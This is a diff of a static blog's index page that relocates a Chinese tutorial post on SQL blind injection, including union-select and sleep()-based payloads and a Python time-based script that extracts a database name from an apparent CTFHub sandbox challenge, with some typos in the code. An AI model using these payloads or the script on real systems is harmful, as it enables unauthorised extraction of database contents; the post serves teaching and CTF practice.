@@ -276,6 +276,72 @@
 
 
   
+    <article id="post-sql盲注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><p>在sql注入中，有一种类型就是盲注，当我们sql注入后，页面没有返回给我们有用的回显时，这时候就需要用到盲注了</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔盲注的使用情况，只有当我们能够判断自己输入的sql语句是否正确时才能使用布尔盲注，</p>
+<p>例如当我们输入一条错误的语句，页面返回错误，输入正确的语句时，页面正常显示<br>下面时布尔盲注中，常用的几个函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">length()<span class="operator">/</span><span class="operator">/</span>测试长度</span><br><span class="line">substr()<span class="operator">/</span><span class="operator">/</span>截取字符</span><br><span class="line">ascii()<span class="operator">/</span><span class="operator">/</span>转换字符的ascii码</span><br></pre></td></tr></table></figure>
+
+<p>具体使用方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,length(database())<span class="operator">=</span><span class="number">3</span><span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,ascll(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">100</span> <span class="operator">/</span><span class="operator">/</span>判断该当前数据库的第一个字符的ascii码是否时<span class="number">100</span>，从而确定字符</span><br></pre></td></tr></table></figure>
+
+<p>我们先判断数据库的长度，再一个一个判断是哪一个字符，通过该方法，我们可以把数据库地全部字符给推出来，甚至可以将数据库中其他信息都给推出，具体方法和整型注入相似<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51553814/article/details/118639300">sql注入实例</a></p>
+<p>由于手动输入的话通常太慢，通常情况下是配合python脚本来完成</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>在布尔盲注的基础之上还有一种类型就是时间盲注</p>
+<p>时间盲注主要是运用了sleep()函数,sleep()函数可以让我们的页面返回产生延迟，如</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slecet <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">1</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>当我们的数据库中的第一个字符是s的时候，页面则延迟一秒返回，否则返回1，需要注意的是，这个返回的1必须是正确返回值，这样，这个if语句无论结果怎样，都能正确地注入</p>
+<p>和布尔盲注不同，有了sleep函数，我们只需要判断页面返回的时间，并不需要页面是否有正确地返回，所以时间盲注通常适用于布尔盲注使用不了的情况，也就是判断不了自己输入的代码是否正确。</p>
+<p>以下是时间盲注python的参考代码，我是以查询database()为例，具体盲注时改变payload即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">url = <span class="string">&quot;http://challenge-95e4b72785c4d45c.sandbox.ctfhub.com:10800/?id=&quot;</span></span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		<span class="built_in">print</span>(i)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">			j = (<span class="number">128</span>+<span class="number">31</span>) -j</span><br><span class="line">			str_ascii=<span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="comment">#数据库名</span></span><br><span class="line">			payolad = <span class="string">&quot;if(substr(database(),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot;</span>%(<span class="built_in">str</span>(i),<span class="built_in">str</span>(str_ascii))</span><br><span class="line">			start_time=time.time()</span><br><span class="line">			str_get = session.get(url=url + payolad)</span><br><span class="line">			end_time = time.time()</span><br><span class="line">			t = end_time - start_time</span><br><span class="line">			<span class="keyword">if</span> t &gt; <span class="number">1</span>:</span><br><span class="line">				<span class="keyword">if</span> str_ascii == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">					sys.exit()</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					name+=str_ascii</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">		<span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注的具体python代码与时间盲注类似</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/24/sql%E7%9B%B2%E6%B3%A8/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-SQL注入实例分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -371,72 +437,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/08/24/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sql盲注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><p>在sql注入中，有一种类型就是盲注，当我们sql注入后，页面没有返回给我们有用的回显时，这时候就需要用到盲注了</p>
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔盲注的使用情况，只有当我们能够判断自己输入的sql语句是否正确时才能使用布尔盲注，</p>
-<p>例如当我们输入一条错误的语句，页面返回错误，输入正确的语句时，页面正常显示<br>下面时布尔盲注中，常用的几个函数</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">length()<span class="operator">/</span><span class="operator">/</span>测试长度</span><br><span class="line">substr()<span class="operator">/</span><span class="operator">/</span>截取字符</span><br><span class="line">ascii()<span class="operator">/</span><span class="operator">/</span>转换字符的ascii码</span><br></pre></td></tr></table></figure>
-
-<p>具体使用方法</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,length(database())<span class="operator">=</span><span class="number">3</span><span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,ascll(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">100</span> <span class="operator">/</span><span class="operator">/</span>判断该当前数据库的第一个字符的ascii码是否时<span class="number">100</span>，从而确定字符</span><br></pre></td></tr></table></figure>
-
-<p>我们先判断数据库的长度，再一个一个判断是哪一个字符，通过该方法，我们可以把数据库地全部字符给推出来，甚至可以将数据库中其他信息都给推出，具体方法和整型注入相似<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51553814/article/details/118639300">sql注入实例</a></p>
-<p>由于手动输入的话通常太慢，通常情况下是配合python脚本来完成</p>
-<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>在布尔盲注的基础之上还有一种类型就是时间盲注</p>
-<p>时间盲注主要是运用了sleep()函数,sleep()函数可以让我们的页面返回产生延迟，如</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slecet <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">1</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-<p>当我们的数据库中的第一个字符是s的时候，页面则延迟一秒返回，否则返回1，需要注意的是，这个返回的1必须是正确返回值，这样，这个if语句无论结果怎样，都能正确地注入</p>
-<p>和布尔盲注不同，有了sleep函数，我们只需要判断页面返回的时间，并不需要页面是否有正确地返回，所以时间盲注通常适用于布尔盲注使用不了的情况，也就是判断不了自己输入的代码是否正确。</p>
-<p>以下是时间盲注python的参考代码，我是以查询database()为例，具体盲注时改变payload即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">url = <span class="string">&quot;http://challenge-95e4b72785c4d45c.sandbox.ctfhub.com:10800/?id=&quot;</span></span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		<span class="built_in">print</span>(i)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">			j = (<span class="number">128</span>+<span class="number">31</span>) -j</span><br><span class="line">			str_ascii=<span class="built_in">chr</span>(j)</span><br><span class="line">			<span class="comment">#数据库名</span></span><br><span class="line">			payolad = <span class="string">&quot;if(substr(database(),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot;</span>%(<span class="built_in">str</span>(i),<span class="built_in">str</span>(str_ascii))</span><br><span class="line">			start_time=time.time()</span><br><span class="line">			str_get = session.get(url=url + payolad)</span><br><span class="line">			end_time = time.time()</span><br><span class="line">			t = end_time - start_time</span><br><span class="line">			<span class="keyword">if</span> t &gt; <span class="number">1</span>:</span><br><span class="line">				<span class="keyword">if</span> str_ascii == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">					sys.exit()</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					name+=str_ascii</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">		<span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure>
-
-<p>布尔盲注的具体python代码与时间盲注类似</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/24/sql%E7%9B%B2%E6%B3%A8/">展开全文 >></a>
         </p>
       
 
